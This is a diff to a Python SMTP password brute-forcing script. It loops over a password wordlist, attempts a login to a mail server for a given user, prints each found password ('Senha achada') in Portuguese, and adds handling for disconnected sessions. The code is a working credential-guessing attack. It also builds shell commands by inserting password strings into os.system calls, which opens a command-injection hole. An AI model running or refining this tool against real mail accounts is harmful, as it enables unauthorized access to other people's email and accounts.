@@ -26,12 +26,17 @@ def SMTPbrute(usr,passw):
         for senhas in passw.readlines():
             try:
                 try:
-                    if smtpserver.login(usr, senhas):
-                        os.system('echo "[+] Senha achada:{}  ^-^" | lolcat'.format(senhas))    
-                        os.system('echo "_____________________________" |lolcat ')        
-                        break
-                except smtplib.SMTPAuthenticationError as e:
-                    os.system("echo '[-] Senha errada: {}' |lolcat  ".format(senhas))
+                    try:
+                        if smtpserver.login(usr, senhas):
+                            os.system('echo "[+] Senha achada:{}  ^-^" | lolcat'.format(senhas))    
+                            os.system('echo "_____________________________" |lolcat ')        
+                            break
+                    except smtplib.SMTPAuthenticationError as e:
+                        os.system("echo '[-] Senha errada: {}' |lolcat  ".format(senhas))
+                except smtplib.SMTPServerDisconnected:
+                    os.system("echo '[-] Conexao fechada pelo host ' |lolcat  ")
+                    break
+
             except KeyboardInterrupt:
                 print("")
                 os.system('echo "_____________________________" |lolcat ') 
